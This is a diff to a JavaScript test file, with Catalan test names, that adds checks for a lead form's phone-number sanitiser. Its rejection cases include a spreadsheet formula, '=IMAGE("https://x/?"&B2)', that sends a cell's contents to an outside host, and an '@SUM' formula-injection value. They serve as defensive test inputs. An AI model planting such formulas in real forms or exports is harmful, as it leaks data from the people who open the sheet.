@@ -298,3 +298,11 @@ test('un clic de descàrrega de PDF es registra; un botó desconegut es rebutja'
   assert.equal(api.sanitizeClick(download).button, 'download');
   assert.equal(api.sanitizeClick({ ...click, click: { ...clickBody, button: 'altre' } }), null);
 });
+
+test('telèfon: format «+prefix número»; un valor que sembla fórmula o no encaixa es rebutja', () => {
+  const { api } = load();
+  const phone = (value) => api.sanitizeLead({ ...complete, contact: { ...contact, email: '', phone: value } });
+  assert.equal(phone('+351 912 345 678').phone, '+351 912 345 678');
+  assert.equal(phone('+34 (93) 123-45-67').phone, '+34 (93) 123-45-67');
+  for (const bad of ['=IMAGE("https://x/?"&B2)', '@SUM(A1)', '600000000', '+34', 'abc']) assert.equal(phone(bad), null, bad);
+});
